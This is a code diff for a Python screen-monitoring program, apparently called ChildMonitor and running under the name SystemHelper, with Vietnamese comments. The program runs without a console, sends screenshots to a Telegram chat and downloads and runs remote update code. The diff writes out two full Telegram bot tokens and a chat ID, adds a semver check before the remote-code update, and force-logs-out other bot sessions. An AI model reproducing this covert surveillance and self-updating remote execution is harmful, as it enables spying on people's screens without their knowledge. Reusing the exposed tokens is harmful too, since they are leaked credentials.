@@ -12,6 +12,12 @@ import subprocess
 import sys
 import threading
 import time
+
+# Fix for PyInstaller noconsole mode crashing when writing to NoneType sys.stdout/stderr
+if sys.stdout is None:
+    sys.stdout = open(os.devnull, "w")
+if sys.stderr is None:
+    sys.stderr = open(os.devnull, "w")
 import urllib.request
 import urllib.parse
 import uuid
@@ -34,7 +40,7 @@ RUNTIME_DIR = BASE_DIR / "runtime"
 VIEWER_DIR = BASE_DIR / "web_viewer"
 
 DEFAULTS = {
-    "telegram_bot_token": "8769415154:AAHvACXi9Urn1H6pcCCWQwgaTV6QqR8leOc",
+    "telegram_bot_token": "8405818522:AAEpqZF10RZZbCKogAr7NquEsTGnjg5DF7Y",
     "telegram_chat_id": "-1003819299308",
     "report_interval_seconds": 60,
     "screenshot_interval_seconds": 60,
@@ -307,7 +313,15 @@ def capture_frame_bgr(monitor_id=-1):
             return img
     except Exception as e:
         logger.error(f"capture_frame_bgr: {e}")
-        return None
+        # Create a dummy image when screen is locked/asleep
+        try:
+            from PIL import Image, ImageDraw, ImageFont
+            img = Image.new('RGB', (1280, 720), color=(20, 20, 20))
+            d = ImageDraw.Draw(img)
+            d.text((400, 340), "Màn hình đang tắt hoặc bị khóa", fill=(255, 255, 255))
+            return img
+        except:
+            return None
 
 
 try:
@@ -667,8 +681,15 @@ def fetch_remote_update():
             remote_version = resp.read().decode("utf-8", "replace").strip()
 
         cur_v = get_current_version()
-        if cur_v == remote_version:
-            return False  # Đã ở phiên bản mới nhất
+        # So sánh version theo semantic versioning — chỉ update khi remote MỚI HƠN, không hạ cấp
+        try:
+            cur_parts = tuple(int(x) for x in cur_v.split("."))
+            rem_parts = tuple(int(x) for x in remote_version.split("."))
+            if rem_parts <= cur_parts:
+                return False  # Remote không mới hơn → bỏ qua
+        except (ValueError, AttributeError):
+            if cur_v == remote_version:
+                return False
 
         code_url = base.rstrip("/") + f"/monitor.py?t={int(time.time())}"
         req_c = urllib.request.Request(code_url, headers={"User-Agent": "Mozilla/5.0"})
@@ -1368,18 +1389,27 @@ def ensure_single_instance():
     global _instance_mutex
     if sys.platform == "win32" and kernel32:
         try:
-            _instance_mutex = kernel32.CreateMutexW(None, False, "Global\\ChildMonitor_SingleInstance_Mutex_2026")
-            if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
-                logger.warning("Đã có tiến trình SystemHelper khác đang chạy. Dừng tiến trình trùng lặp.")
+            # Cấu hình ctypes đúng cách để CreateMutexW và GetLastError hoạt động chính xác
+            kernel32.CreateMutexW.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_wchar_p]
+            kernel32.CreateMutexW.restype = ctypes.c_void_p
+
+            _instance_mutex = kernel32.CreateMutexW(None, True, "Global\\ChildMonitor_SingleInstance_Mutex_2026")
+            last_err = ctypes.get_last_error()  # Dùng ctypes.get_last_error() thay vì kernel32.GetLastError()
+
+            if last_err == 183:  # ERROR_ALREADY_EXISTS
+                logger.warning("Mutex already held — another instance is running. Exiting.")
                 os._exit(0)
-        except Exception:
-            pass
+            else:
+                logger.info(f"Mutex acquired successfully (err={last_err}). Single instance confirmed.")
+        except Exception as e:
+            logger.warning(f"ensure_single_instance exception: {e}")
 
 
 def release_single_instance():
     global _instance_mutex
     if sys.platform == "win32" and kernel32 and _instance_mutex:
         try:
+            kernel32.ReleaseMutex(_instance_mutex)
             kernel32.CloseHandle(_instance_mutex)
             _instance_mutex = None
         except Exception:
@@ -1409,6 +1439,7 @@ def command_listener():
     headers = {"Host": "api.telegram.org", "Connection": "keep-alive"}
     webhook_cleared = False
     consecutive_errors = 0
+    consecutive_409 = 0
 
     while True:
         try:
@@ -1431,16 +1462,34 @@ def command_listener():
             resp = poll_conn.getresponse()
             raw_data = resp.read()
 
-            # Xử lý lỗi HTTP 409 Conflict — có tiến trình khác đang poll
+            # Xử lý lỗi HTTP 409 Conflict — có tiến trình/máy khác đang poll cùng token
             if resp.status == 409:
-                log_line("errors", "command_listener: 409 Conflict — có tiến trình bot khác đang chạy. Đang reset...")
+                consecutive_409 += 1
                 try:
                     poll_conn.close()
                 except Exception:
                     pass
                 poll_conn = None
-                _telegram_delete_webhook()
-                time.sleep(2)
+
+                # Lần đầu gặp 409: gọi logOut để buộc tất cả session cũ ngắt kết nối
+                if consecutive_409 == 1:
+                    log_line("errors", "command_listener: 409 Conflict — calling logOut to disconnect all other sessions...")
+                    try:
+                        lo_conn = http.client.HTTPSConnection("api.telegram.org", timeout=10)
+                        lo_conn.request("POST", f"/bot{cfg['telegram_bot_token']}/logOut",
+                                        headers={"Host": "api.telegram.org"})
+                        lo_resp = lo_conn.getresponse()
+                        lo_resp.read()
+                        lo_conn.close()
+                        logger.info("logOut OK — all other polling sessions disconnected.")
+                    except Exception as e:
+                        log_line("errors", f"logOut failed: {e}")
+                    time.sleep(5)  # Chờ Telegram xử lý logOut
+                else:
+                    # Các lần sau: chờ lâu hơn (tối đa 30s)
+                    wait = min(3 * consecutive_409, 30)
+                    log_line("errors", f"command_listener: 409 Conflict (attempt {consecutive_409}), waiting {wait}s...")
+                    time.sleep(wait)
                 continue
 
             # Xử lý các lỗi HTTP khác
@@ -1458,6 +1507,7 @@ def command_listener():
 
             if data.get("ok"):
                 consecutive_errors = 0  # Reset bộ đếm lỗi khi thành công
+                consecutive_409 = 0    # Reset bộ đếm 409
                 for result in data.get("result", []):
                     last_update_id = max(last_update_id, result.get("update_id", 0))
                     
@@ -1508,9 +1558,12 @@ def main():
     # Kiểm tra nạp code động từ runtime/ nếu đang chạy file gốc
     if __name__ != "monitor_runtime":
         if fetch_remote_update():
+            release_single_instance()  # Giải phóng Mutex để runtime code tạo lại được
             if run_runtime_code():
                 log_line("system", f"running runtime code v{get_current_version()}")
                 return
+            else:
+                ensure_single_instance()  # Runtime thất bại → lấy lại Mutex
 
     # Khởi chạy HTTP Server cho Web Viewer
     start_embedded_viewer_server(port=8088)
